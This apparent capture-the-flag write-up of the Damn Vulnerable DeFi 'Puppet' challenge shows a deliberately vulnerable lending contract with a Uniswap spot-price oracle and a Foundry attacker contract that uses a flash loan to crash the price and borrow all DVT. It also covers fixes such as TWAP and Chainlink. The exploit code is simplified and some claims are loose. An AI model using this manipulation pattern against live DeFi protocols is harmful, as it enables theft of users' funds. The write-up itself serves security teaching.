# Damn Vulnerable DeFi: Puppet

## Challenge Description
A lending pool allows users to borrow DVT tokens. The collateral required is calculated based on the DVT/ETH price in a Uniswap V2 pool. The Uniswap pool has 10 DVT and 10 ETH. The lending pool has 100,000 DVT. Your goal is to borrow all 100,000 DVT from the lending pool.

**Difficulty:** ⭐⭐⭐⭐ (Hard)

**Goal:** Exploit the oracle to borrow all DVT tokens with minimal collateral.

## Vulnerable Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract PuppetPool {
    IERC20 public token;
    IUniswapV2Pair public uniswapPair;

    constructor(IERC20 _token, IUniswapV2Pair _uniswapPair) {
        token = _token;
        uniswapPair = _uniswapPair;
    }

    function calculateDepositOfWETHRequired(uint256 tokenAmount) public view returns (uint256) {
        // Get the spot price from Uniswap
        uint256 dexBalance = token.balanceOf(address(uniswapPair));
        uint256 ethBalance = address(uniswapPair).balance;

        // Price = ethBalance / dexBalance
        uint256 price = (ethBalance * 1e18) / dexBalance;

        // Require 2x the value in WETH as collateral
        return (tokenAmount * price * 2) / 1e18;
    }

    function borrow(uint256 amount) external payable {
        uint256 requiredDeposit = calculateDepositOfWETHRequired(amount);
        require(msg.value >= requiredDeposit, "Not enough collateral");

        token.transfer(msg.sender, amount);
    }
}
```

## Vulnerability Analysis

```text
THE BUG: The lending pool uses the Uniswap V2 SPOT PRICE as its oracle.

Spot price is calculated as: `ethBalance / dexBalance`.
This is highly manipulable!

If an attacker uses a Flash Loan to dump a massive amount of ETH into the Uniswap pool
to buy DVT, the `dexBalance` (DVT in the pool) will drop drastically, and `ethBalance` will rise.
This causes the calculated `price` to skyrocket.

Wait, if price skyrockets, collateral requirement goes UP. That's bad for the attacker.

Let's reverse it: The attacker wants the collateral requirement to go DOWN.
So the attacker should DUMP DVT into the Uniswap pool to buy ETH!
If the attacker adds a massive amount of DVT to the pool, `dexBalance` becomes huge.
The formula `price = (ethBalance * 1e18) / dexBalance` will result in a price close to ZERO.

With the price near zero, the required collateral (`tokenAmount * price * 2`) also becomes near zero!
The attacker can then borrow 100,000 DVT for almost no ETH.
```

## Exploit Strategy

```text
Step 1: Take a Flash Loan of a massive amount of DVT tokens (e.g., from another protocol).
Step 2: Swap this massive amount of DVT for ETH on the Uniswap V2 pool.
        This drastically increases the DVT balance in the pool, crashing the DVT/ETH price to near zero.
Step 3: Call PuppetPool.borrow(100,000 DVT) with a tiny amount of ETH as collateral.
        The pool's calculateDepositOfWETHRequired() will return a very small number because the oracle price is crashed.
Step 4: The pool transfers 100,000 DVT to you.
Step 5: Repay the Flash Loan (using some of the borrowed DVT or ETH).
Step 6: Profit.
```

## Exploit Contract (Foundry)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/DamnVulnerableDeFi/PuppetPool.sol";

contract PuppetAttacker {
    IFlashLoanProvider public flashLoanProvider;
    PuppetPool public puppetPool;
    IUniswapV2Router public router;
    IERC20 public dvt;

    constructor(
        IFlashLoanProvider _flashLoanProvider,
        PuppetPool _puppetPool,
        IUniswapV2Router _router,
        IERC20 _dvt
    ) {
        flashLoanProvider = _flashLoanProvider;
        puppetPool = _puppetPool;
        router = _router;
        dvt = _dvt;
    }

    function attack() external {
        // Step 1: Request flash loan of DVT
        flashLoanProvider.flashLoan(address(this), 100000 ether);
    }

    function executeFlashLoan(uint256 amount) external {
        require(msg.sender == address(flashLoanProvider), "Unauthorized");

        // Step 2: Swap DVT for ETH on Uniswap to crash the price
        dvt.approve(address(router), amount);
        address[] memory path = new address[](2);
        path[0] = address(dvt);
        path[1] = router.WETH();
        router.swapExactTokensForETH(amount, 0, path, address(this), block.timestamp);

        // Step 3: Borrow 100,000 DVT from PuppetPool with minimal ETH collateral
        uint256 borrowAmount = 100000 ether;
        uint256 requiredCollateral = puppetPool.calculateDepositOfWETHRequired(borrowAmount);

        puppetPool.borrow{value: requiredCollateral}(borrowAmount);

        // Step 5: Repay flash loan (simplified)
        flashLoanProvider.repay(amount);
    }

    receive() external payable {}
}
```

## Real-World Impact

```text
Oracle manipulation via DEX spot price is the #1 cause of DeFi hacks.

Real-world examples:
- Cream Finance (2021): $130M lost. Attacker manipulated the spot price of assets to borrow massively.
- bZx (2020): Multiple hacks totaling millions, all using flash loans to manipulate Kyber/Uniswap spot prices.
- Mango Markets (2022): $100M+ lost. Attacker manipulated the perp DEX oracle price to drain the lending pool.

The Solution:
- NEVER use DEX spot price as an oracle for lending/liquidation.
- Use Time-Weighted Average Price (TWAP) from Uniswap V3.
- Use decentralized oracle networks like Chainlink that aggregate prices from multiple sources and are resistant to single-DEX manipulation.
```

## Key Takeaways
- **Spot Price is Manipulable:** A single large trade can drastically change the spot price of a low-liquidity pool.
- **Flash Loans + Oracle = Disaster:** Flash loans provide the capital needed to manipulate the oracle, and the oracle provides the inflated/deflated value needed to exploit the lending pool.
- **Use TWAP or Chainlink:** Lending protocols must use robust, manipulation-resistant price feeds.
- **Lesson Learned:** If your protocol's solvency depends on a price, that price must be economically infeasible to manipulate.
